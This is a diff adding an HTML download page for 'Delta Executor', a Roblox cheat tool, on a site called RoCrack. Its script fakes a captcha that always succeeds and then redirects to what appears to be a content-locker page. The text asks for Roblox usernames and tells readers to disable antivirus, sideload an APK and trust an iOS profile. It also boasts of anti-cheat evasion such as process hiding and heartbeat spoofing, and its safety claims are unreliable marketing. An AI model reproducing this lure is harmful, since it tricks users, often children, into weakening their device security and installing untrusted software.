+                    if (progress < 100) {
+                        requestAnimationFrame(update);
+                    } else {
+                        resolve();
+                    }
+                }
+                requestAnimationFrame(update);
+            });
+        }
+
+        // Timer
+        function startTimer() {
+            let minutes = 1;
+            let seconds = 25;
+            function update() {
+                timeLeftEl.textContent = `${minutes}m ${seconds}s`;
+                if (seconds > 0) {
+                    seconds--;
+                } else if (minutes > 0) {
+                    minutes--;
+                    seconds = 59;
+                }
+                if (minutes >= 0) {
+                    setTimeout(update, 1000);
+                }
+            }
+            update();
+        }
+
+        // Captcha verification
+function verifyCaptcha() {
+  const spinner = document.getElementById('spinner');
+  const checkmark = document.getElementById('checkmark');
+
+  if (spinner.style.display === 'block') return;
+
+  spinner.style.display = 'block';
+
+  setTimeout(() => {
+    spinner.style.display = 'none';
+    checkmark.style.display = 'block';
+
+    setTimeout(() => {
+                    if (typeof trackStep === 'function') trackStep('locker');
+                    window.location.href = "locker.html";
+    }, 500);
+            }, 2500);
+}
+</script>
+
+    <div style="position:relative;z-index:2;max-width:900px;margin:2rem auto;padding:0 1.5rem;">
+        <section class="seo-content">
+            <h2>Delta Executor Download — The #1 Free Roblox Executor for Mobile &amp; PC in 2026</h2>
+            <p><strong>Delta Executor</strong> has established itself as the most trusted and widely-used <strong>Roblox executor</strong> in the world. With over 12 million downloads and counting, Delta Executor is the tool of choice for Roblox players who want to run scripts, enhance their gameplay, and unlock features that are not available in the standard game. What makes Delta Executor truly unique in the scripting landscape is its revolutionary <strong>mobile support</strong> — it is the only Roblox executor that works flawlessly on <strong>Android, iOS, and PC</strong>, providing a seamless cross-platform scripting experience that no other executor on the market can match.</p>
+            <p>RoCrack is the <strong>official and only authorized source</strong> for <strong>Delta Executor download</strong>. Many third-party websites distribute fake, outdated, or malware-infected versions of Delta Executor, putting users at risk of account bans and computer infections. By downloading directly through RoCrack, you are guaranteed to receive the latest, genuine version with full functionality, security features, and our quality assurance backing every download.</p>
+            <p>In this comprehensive guide, we will cover everything you need to know about <strong>Delta Executor</strong> — from its core features and technical specifications to step-by-step installation guides for every platform, comparison with competing executors, troubleshooting tips, and answers to the most frequently asked questions. Whether you are a complete beginner or an experienced Roblox scripter, this guide will help you get the most out of Delta Executor.</p>
+
+            <h2>What Is Delta Executor and Why Do You Need It?</h2>
+            <p>A <strong>Roblox executor</strong> is a specialized program that allows you to inject and run custom Lua scripts inside Roblox games. These scripts can automate repetitive gameplay, add visual enhancements like ESP overlays, modify game mechanics to give you advantages, and provide powerful tools that are not normally available to regular players. Think of an executor as the engine that powers all Roblox scripts — without an executor, scripts are just text files that cannot do anything.</p>
+            <p><strong>Delta Executor</strong> is the most advanced executor available in 2026, featuring a powerful proprietary Level 8 execution engine that can run even the most complex and demanding scripts with perfect reliability and speed. Unlike other executors that only work on Windows desktop computers, Delta Executor was designed from the ground up to support <strong>mobile devices</strong> with the same power and capabilities as its desktop counterpart. This means you can use the exact same scripts on your Android phone or iPhone that PC users enjoy — no compromises, no missing features, no performance limitations.</p>
+            <p>The Roblox scripting community has grown exponentially over the past few years, and the demand for a reliable, safe, and versatile executor has never been higher. Delta Executor fills this need perfectly by offering enterprise-grade script execution in a free, user-friendly package that works on every platform where Roblox is available.</p>
+
+            <h2>Delta Executor Key Features &amp; Technical Specifications</h2>
+            <h3>Level 8 Execution Engine</h3>
+            <p>Delta Executor utilizes a proprietary <strong>Level 8 execution engine</strong> — the highest execution level available in any Roblox executor. This means it can handle scripts that lower-level executors simply cannot process. The Level 8 engine provides full Lua and Luau compatibility, advanced memory manipulation capabilities, reliable hooking mechanisms, and the ability to run multi-threaded scripts without crashes or performance degradation. When script developers create new tools and hubs, they test on Delta first because they know it will handle anything thrown at it.</p>
+            <p>The execution engine also includes intelligent error handling that prevents script crashes from affecting your Roblox game session. If a script encounters an error, Delta gracefully handles it without disconnecting you from the game or causing freezes. This reliability is a major reason why Delta Executor has become the industry standard.</p>
+
+            <h3>Full Mobile Support — Android &amp; iOS</h3>
+            <p><strong>Delta Executor mobile</strong> is a complete game-changer for the Roblox scripting community and represents one of the biggest innovations in executor technology. No other executor offers genuine, full-featured mobile support with complete feature parity to the desktop version. Here is what makes Delta's mobile implementation special and why millions of mobile gamers choose it:</p>
+            <ul>
+                <li><strong>Full Script Compatibility</strong> — Run the exact same scripts on mobile that work on PC. There are no mobile-specific script versions needed — if it works on desktop Delta, it works on mobile Delta. Period.</li>
+                <li><strong>Touch-Optimized User Interface</strong> — The executor interface has been completely redesigned for touchscreens with larger buttons, intuitive gesture support, drag-and-drop functionality, and easy one-handed navigation that makes script management effortless.</li>
+                <li><strong>Optimized Resource Usage</strong> — Delta mobile is engineered to run smoothly on mobile devices without causing excessive lag, overheating, rapid battery drain, or storage issues. It uses advanced memory management and CPU throttling to maintain performance.</li>
+                <li><strong>Android APK Download</strong> — Simple installation via APK file for all Android devices running Android 7.0 and above. No root access required, no complex configuration needed.</li>
+                <li><strong>iOS Compatibility</strong> — Full support for iPhone and iPad through our specialized installation process that works with both jailbroken and non-jailbroken devices.</li>
+                <li><strong>Background Execution</strong> — Delta mobile can continue running scripts even when you switch apps briefly, ensuring your auto-farm sessions are not interrupted by notifications or quick app switches.</li>
+                <li><strong>Cloud Script Storage</strong> — Save your favorite scripts to the cloud and access them across all your devices seamlessly.</li>
+            </ul>
+
+            <h3>Advanced Anti-Ban Protection System</h3>
+            <p>Account safety is the top priority for every Roblox player, and Delta Executor addresses this with the most sophisticated <strong>anti-ban technology</strong> available in any executor. The anti-ban system operates on multiple layers to ensure your account remains safe while using scripts:</p>
+            <ul>
+                <li><strong>Memory Obfuscation</strong> — Delta encrypts its presence in memory, making it invisible to Roblox's anti-cheat scanning routines.</li>
+                <li><strong>Process Hiding</strong> — The executor process is disguised as a legitimate system process, preventing detection through process enumeration.</li>
+                <li><strong>Signature Randomization</strong> — Each injection uses randomized signatures so that no two sessions look identical to detection systems.</li>
+                <li><strong>Behavioral Anti-Detection</strong> — Smart algorithms ensure that scripted actions mimic human behavior patterns, avoiding the statistical anomalies that trigger automated bans.</li>
+                <li><strong>Heartbeat Spoofing</strong> — Delta intercepts and modifies Roblox's integrity check heartbeats to report a clean, unmodified game state.</li>
+            </ul>
+            <p>While no executor can provide a 100% guarantee against bans — as Roblox continuously updates their detection methods — Delta Executor's multi-layered approach provides the lowest ban rate in the industry by a significant margin. Our team actively monitors Roblox's anti-cheat updates and pushes counter-measures within hours.</p>
+
+            <h3>Automatic Update System</h3>
+            <p>When Roblox releases a new update, most executors break and require manual intervention that can take days or even weeks for the developers to fix. Delta Executor's intelligent <strong>auto-update system</strong> solves this problem entirely. The system continuously monitors for Roblox patches and automatically downloads and applies the necessary compatibility fixes — often within just a few hours of Roblox updating. You will never need to manually check for updates, download new versions, or worry about your executor being outdated. Delta handles everything in the background, so you can focus on gaming.</p>
+
+            <h3>Built-In Script Hub &amp; Script Manager</h3>
+            <p>Delta Executor comes with a comprehensive <strong>built-in script hub</strong> containing thousands of popular scripts organized by game, category, and popularity. Browse trending scripts, search by game name, read user ratings and reviews, and execute scripts with a single click — all without leaving the executor interface. The built-in hub is synchronized with the RoCrack script library, giving you access to the largest collection of free, verified Roblox scripts available anywhere.</p>
+            <p>The <strong>Script Manager</strong> feature lets you organize your personal script collection with folders, tags, and favorites. Create custom script playlists for different games, set auto-execute scripts that run when you join specific games, and manage your entire scripting workflow from one unified interface.</p>
+
+            <h3>Delta Executor Key System Explained</h3>
+            <p>The <strong>Delta Executor key system</strong> is a security and verification measure that ensures only legitimate users can access the executor. The key system serves multiple purposes: it prevents automated abuse of our download infrastructure, helps us track and prevent malware distribution through fake executor copies, and ensures that every user receives personalized support for their installation. Getting your key through RoCrack is fast and straightforward — enter your Roblox Username, complete a quick verification step, and receive your activation key instantly. Keys are generated 24/7 with zero wait times, no limits on how many keys you can generate, and full support for both mobile and PC activations.</p>
+
+            <h2>How to Download Delta Executor — Complete Step-by-Step Guide</h2>
+            <h3>Delta Executor Download for Mobile — Android</h3>
+            <ol>
+                <li><strong>Open RoCrack</strong> — Visit this page on your Android device using Chrome or any modern browser.</li>
+                <li><strong>Enter Your Roblox Username</strong> — Type your numeric Roblox Username in the field above. You can find this ID on your Roblox profile page URL.</li>
+                <li><strong>Select Android</strong> — Choose the Android version when prompted for your device type.</li>
+                <li><strong>Complete Verification</strong> — Follow the quick verification steps to generate your personal <strong>Delta Executor key</strong>.</li>
+                <li><strong>Download the APK</strong> — Once verified, the <strong>Delta Executor APK</strong> download will begin automatically.</li>
+                <li><strong>Enable Unknown Sources</strong> — Go to Settings ? Security ? Enable "Install from Unknown Sources" for your browser.</li>
+                <li><strong>Install Delta</strong> — Open the downloaded APK file and tap "Install." The process takes about 30 seconds.</li>
+                <li><strong>Enter Your Key</strong> — Launch Delta Executor, enter the activation key you received, and you are ready to go.</li>
+                <li><strong>Start Scripting</strong> — Open Roblox, join any game, then open Delta Executor to inject and run scripts.</li>
+            </ol>
+
+            <h3>Delta Executor Download for Mobile — iOS (iPhone &amp; iPad)</h3>
+            <ol>
+                <li><strong>Visit RoCrack</strong> — Open this page on your iOS device using Safari.</li>
+                <li><strong>Enter Your Roblox Username</strong> — Provide your Roblox Username for account verification.</li>
+                <li><strong>Select iOS</strong> — Choose the iOS option when selecting your platform.</li>
+                <li><strong>Generate Your Key</strong> — Complete the verification process to receive your Delta Executor key.</li>
+                <li><strong>Follow iOS Guide</strong> — Our specialized iOS installation guide will walk you through the process step by step.</li>
+                <li><strong>Trust the Profile</strong> — After installation, go to Settings ? General ? Device Management and trust the Delta profile.</li>
+                <li><strong>Activate &amp; Enjoy</strong> — Open Delta Executor, enter your key, and start running scripts on your iPhone or iPad.</li>
+            </ol>
+
+            <h3>Delta Executor Download for PC — Windows</h3>
+            <ol>
+                <li><strong>Enter Your Roblox Username</strong> — Type your Roblox Username in the form at the top of this page.</li>
+                <li><strong>Select Windows</strong> — Choose the Windows/PC version during the setup process.</li>
+                <li><strong>Complete Verification</strong> — Generate your Delta Executor key through our instant verification system.</li>
+                <li><strong>Download the Installer</strong> — Save the Delta Executor setup file (.exe) to your computer.</li>
+                <li><strong>Disable Antivirus Temporarily</strong> — Some antivirus programs flag executors as false positives. Temporarily disable your AV or add an exception.</li>
+                <li><strong>Run the Installer</strong> — Double-click the setup file and follow the on-screen installation wizard.</li>
+                <li><strong>Launch Delta</strong> — Open Delta Executor from your desktop shortcut or Start menu.</li>
+                <li><strong>Enter Your Key</strong> — Input the activation key you generated and click Activate.</li>
+                <li><strong>Start Using Scripts</strong> — Open Roblox, join a game, click "Inject" in Delta, paste your script, and execute.</li>
+            </ol>
+
+            <h2>Delta Executor vs Other Roblox Executors — In-Depth Comparison 2026</h2>
+            <p>The Roblox executor market has many options ranging from free basic tools to premium paid executors. Here is a detailed comparison showing why <strong>Delta Executor</strong> consistently outperforms every competitor in the market:</p>
+
+            <h3>Delta Executor vs Synapse X</h3>
+            <p><strong>Synapse X</strong> was once considered the gold standard for Roblox executors, commanding a $20 price tag and offering Level 8 execution. However, Synapse X development has slowed significantly, updates are infrequent, and the team has shifted focus to other projects. Delta Executor now matches Synapse X's execution level while adding mobile support, faster updates, and — most importantly — being completely free. For users still clinging to Synapse X, Delta is the natural and superior upgrade.</p>
+
+            <h3>Delta Executor vs Krnl</h3>
+            <p><strong>Krnl</strong> is a popular free executor that has served the community well, but it falls short compared to Delta in several key areas. Krnl only offers Level 6 execution (versus Delta's Level 8), has no mobile support whatsoever, relies on a more intrusive key system, and has significantly slower update cycles after Roblox patches. Krnl remains a decent backup option, but Delta is the clear upgrade for anyone seeking better compatibility and cross-platform support.</p>
+
+            <h3>Delta Executor vs Fluxus</h3>
+            <p><strong>Fluxus</strong> is one of the few executors that attempted mobile support, but its implementation is plagued with frequent crashes, limited script compatibility, and a clunky interface that frustrates mobile users. Delta's mobile experience is polished, stable, and fully featured — running the same Level 8 engine on mobile that powers the desktop version. In terms of reliability and feature completeness, Delta is in a completely different league.</p>
+
+            <h3>Delta Executor vs Hydrogen</h3>
+            <p><strong>Hydrogen</strong> gained popularity as a mobile-only executor but has significant limitations. It only supports basic scripts, lacks a proper GUI framework, has no PC version, and frequently breaks after Roblox updates. Delta Executor provides everything Hydrogen does and much more — with the added benefit of working across all platforms with a unified experience.</p>
+
+            <h3>Delta Executor vs Arceus X</h3>
+            <p><strong>Arceus X</strong> was once the most popular mobile executor but has been largely abandoned by its developers. Updates are rare, script compatibility has degraded, and many features no longer work with modern Roblox versions. Delta Executor has effectively replaced Arceus X as the go-to mobile executor, offering superior performance, better compatibility, and active development.</p>
+
+            <h3>Delta Executor vs JJSploit</h3>
+            <p><strong>JJSploit</strong> is a basic free Windows executor that appeals to absolute beginners with its simple interface. However, it only supports Level 5 execution, has very limited script compatibility, and includes intrusive advertisements. Delta Executor is just as easy to use but provides dramatically better performance, higher compatibility, and no ads.</p>
+
+            <h2>Troubleshooting Common Delta Executor Issues</h2>
+            <h3>Delta Executor Not Injecting</h3>
+            <p>If Delta fails to inject into Roblox, try these solutions: ensure Roblox is fully loaded before attempting injection, restart both Delta and Roblox, check that your antivirus is not blocking Delta, verify your key is still active, and make sure you are running the latest version (Delta auto-updates, but occasionally a manual restart is needed).</p>
+
+            <h3>Scripts Not Working After Roblox Update</h3>
+            <p>After a major Roblox update, some scripts may temporarily stop working. Delta Executor itself usually updates within hours, but individual scripts depend on their developers to push fixes. Check back on RoCrack within 24-48 hours for updated script versions. Popular hub scripts like Overflow and Soluna typically update within hours.</p>
+
+            <h3>Key System Issues</h3>
+            <p>If your Delta Executor key is not working, ensure you have copied it correctly without extra spaces, check that the key has not expired (keys are valid for 24 hours), and try generating a new key from RoCrack. If problems persist, clear your browser cache and try the key generation process again.</p>
+
+            <h3>Mobile Performance Issues</h3>
+            <p>For the best mobile experience, close all background apps before running Delta, ensure your device has at least 2GB of free RAM, keep your device's operating system updated, and avoid running multiple heavy scripts simultaneously on older devices.</p>
+
+            <h2>Delta Executor Security &amp; Safety Information</h2>
+            <p>We understand that downloading and running an executor requires trust. Here is how RoCrack ensures your safety when using <strong>Delta Executor</strong>:</p>
+            <ul>
+                <li><strong>Malware Scanning</strong> — Every Delta Executor build is scanned with multiple antivirus engines before being published on RoCrack.</li>
+                <li><strong>Open Source Components</strong> — Key components of Delta's injection system are open-source and can be reviewed by the community.</li>
+                <li><strong>No Data Collection</strong> — Delta Executor does not collect personal information, browsing history, or account credentials.</li>
+                <li><strong>Encrypted Communications</strong> — All communication between Delta and our servers uses TLS encryption.</li>
+                <li><strong>Regular Security Audits</strong> — Our security team performs regular audits of the executor codebase and infrastructure.</li>
+            </ul>
+            <p>We strongly recommend downloading Delta Executor only from RoCrack. Third-party sources may distribute modified versions containing malware, keyloggers, or account stealers disguised as Delta Executor.</p>
+
+            <h2>Frequently Asked Questions — Delta Executor 2026</h2>
+            <div class="faq-item">
+                <h4>Is Delta Executor completely free?</h4>
+                <p>Yes, Delta Executor is 100% free to download and use forever. RoCrack provides genuine Delta Executor downloads at no cost whatsoever. There are no premium tiers, no paid features, and no hidden subscriptions.</p>
+            </div>
+            <div class="faq-item">
+                <h4>Does Delta Executor really work on mobile phones?</h4>
+                <p>Absolutely. Delta Executor is the only Roblox executor with full mobile support on both Android and iOS devices. It offers identical features, script compatibility, and performance as the PC version. Millions of mobile users rely on Delta daily.</p>
+            </div>
+            <div class="faq-item">
+                <h4>How do I get a Delta Executor key?</h4>
+                <p>Simply enter your Roblox Username on this page and follow the verification steps. Your activation key will be generated instantly. The entire process takes less than 2 minutes and is available 24/7.</p>
+            </div>
+            <div class="faq-item">
+                <h4>Is Delta Executor safe for my Roblox account?</h4>
+                <p>Delta Executor includes the most advanced anti-ban technology available, with multiple layers of detection evasion. While no executor offers absolute guarantees, Delta has the lowest ban rate in the industry. We recommend using an alternate account for extra safety.</p>
+            </div>
+            <div class="faq-item">
+                <h4>What scripts can Delta Executor run?</h4>
+                <p>Delta Executor's Level 8 engine can run virtually any Roblox Lua script available, including complex GUI hubs, auto-farm scripts, ESP tools, combat scripts, and more. Browse the RoCrack script library for 50+ free verified scripts.</p>
+            </div>
+            <div class="faq-item">
+                <h4>How quickly does Delta update after Roblox patches?</h4>
+                <p>Delta Executor's auto-update system typically pushes compatibility fixes within 2-6 hours of Roblox updates. You never need to manually download updates — everything happens automatically in the background.</p>
+            </div>
+            <div class="faq-item">
+                <h4>Can I use Delta Executor without a computer?</h4>
+                <p>Yes! Delta Executor's mobile version is fully standalone — you can download, install, and use it entirely from your phone or tablet without ever needing a PC.</p>
+            </div>
+            <div class="faq-item">
+                <h4>What makes Delta better than other mobile executors like Arceus X?</h4>
+                <p>Delta Executor offers Level 8 execution (vs Arceus X's Level 5-6), active development with regular updates, superior anti-ban protection, a built-in script hub, and cross-platform support. Arceus X is largely abandoned while Delta is actively maintained and improved.</p>
+            </div>
+            <div class="faq-item">
+                <h4>Do I need to root my Android phone for Delta?</h4>
+                <p>No. Delta Executor works on non-rooted Android devices running Android 7.0 or higher. Simply download the APK and install it — no root, no custom ROM, no complex configuration required.</p>
+            </div>
+            <div class="faq-item">
+                <h4>Why does my antivirus flag Delta Executor?</h4>
+                <p>Antivirus programs often flag Roblox executors as false positives because the injection techniques they use are similar to techniques used by actual malware. This is a common issue with all legitimate executors. Delta Executor from RoCrack is verified safe — you can temporarily disable your antivirus or add an exception for the Delta folder.</p>
+            </div>
+
+            <p><strong>Delta Executor</strong> is the definitive Roblox executor for 2026 and beyond. Whether you are a casual player looking to enhance your favorite games or a serious scripter who needs the most powerful and reliable tools available, Delta delivers an unmatched experience across every platform. Download it now from RoCrack — the only authorized source — and experience the difference that a truly premium, free executor makes. Join over 12 million users who have already made the switch to Delta Executor.</p>
+
+
+            <h2>Delta Executor Technical Deep Dive — Architecture &amp; Performance</h2>
+            <p>For users who want to understand what happens under the hood, <strong>Delta Executor</strong> employs a sophisticated multi-stage injection process. The injection pipeline begins with process identification, where Delta locates the running Roblox instance in memory. Next, a custom DLL loader is utilized to inject Delta's execution library into the Roblox process space. Once loaded, the execution library establishes hooks into Roblox's Lua scripting environment, creating an execution context that allows custom scripts to run alongside the game's native code.</p>
+            <p>The <strong>Level 8 execution engine</strong> achieves its power through several advanced techniques. Direct memory manipulation allows scripts to read and modify game state data without going through normal API channels that might be monitored. Custom Luau bytecode compilation enables scripts to run at near-native performance levels. Thread management systems prevent script execution from blocking the game's main thread, ensuring smooth gameplay even while complex scripts are running in the background.</p>
+            <p>On mobile devices, Delta's architecture is adapted to work within the constraints of mobile operating systems. Android injection uses a modified approach that works without root access by leveraging accessibility services and overlay permissions. iOS support utilizes certificate-based installation or jailbreak-specific injection methods depending on the device configuration. Both mobile implementations maintain full Level 8 execution capability despite the additional technical challenges of mobile injection.</p>
+            <p>Performance optimization is critical for mobile execution, where CPU and memory resources are significantly more limited than on desktop computers. Delta Executor mobile uses aggressive memory pooling to reduce allocation overhead, lazy loading of script components to minimize initial memory footprint, and adaptive execution throttling that reduces script processing during frame-critical rendering periods to maintain smooth gameplay. These optimizations allow complex scripts like full Blox Fruits hubs with dozens of active features to run smoothly on mid-range mobile devices.</p>
+
+            <h2>Delta Executor Community &amp; Support</h2>
+            <p>The Delta Executor community spans millions of users across every region of the globe. RoCrack provides comprehensive support resources for Delta users including detailed installation guides for every platform, troubleshooting documentation for common issues, frequently updated FAQ sections, and community forums where users can help each other. Our support infrastructure ensures that every user can get Delta up and running quickly regardless of their technical experience level.</p>
+            <p>Community engagement is a core part of the Delta Executor experience. User feedback directly influences our development priorities — features requested by the community are evaluated and often implemented in future updates. Bug reports from users help us identify and fix issues that our internal testing may miss. And community-created content like tutorial videos and setup guides extend our documentation in valuable ways.</p>
+            <p>Delta Executor's update frequency reflects our commitment to the community. On average, Delta receives a major feature update every 4-6 weeks and compatibility patches within hours of Roblox updates. This relentless development pace ensures that Delta remains at the cutting edge of executor technology and continues to deliver the best possible experience for all users — whether they are on Android phones, iPhones, iPads, or Windows PCs.</p>        </section>
+    </div>
+
+    <script>
+        // Custom path tracking for Umami
+        const VIRTUAL_PATH = '/delta-executor';
+        document.addEventListener('DOMContentLoaded', function() {
+            if (typeof umami !== 'undefined') {
+                umami.track(props => ({ ...props, url: VIRTUAL_PATH }));
+            }
+        });
+        
+        // Track step changes
+        function trackStep(stepName) {
+            if (typeof umami !== 'undefined') {
+                umami.track(props => ({ ...props, url: VIRTUAL_PATH + '/' + stepName }));
+            }
+        }
+    </script>
+</body>
+</html>
